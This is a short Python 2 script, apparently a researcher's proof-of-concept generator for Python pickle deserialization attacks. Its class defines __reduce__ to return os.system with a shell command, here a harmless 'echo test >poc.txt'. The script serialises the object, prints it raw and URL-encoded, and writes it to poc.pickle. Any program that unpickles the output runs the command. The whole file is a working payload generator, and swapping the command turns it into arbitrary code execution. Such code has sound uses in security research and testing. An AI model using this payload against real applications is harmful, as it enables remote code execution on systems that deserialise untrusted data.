# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'
__filename__ = 'pickle_poc_gen.py'

import cPickle
import os
import urllib

class genpoc(object):
    def __reduce__(self):
        s = """echo test >poc.txt"""  #要执行的命令
        return os.system, (s,)        #os.system("echo test >poc.txt")

e = genpoc()
poc = cPickle.dumps(e)

print poc
print urllib.quote(poc)
fp = open("poc.pickle","w")
fp.write(poc)

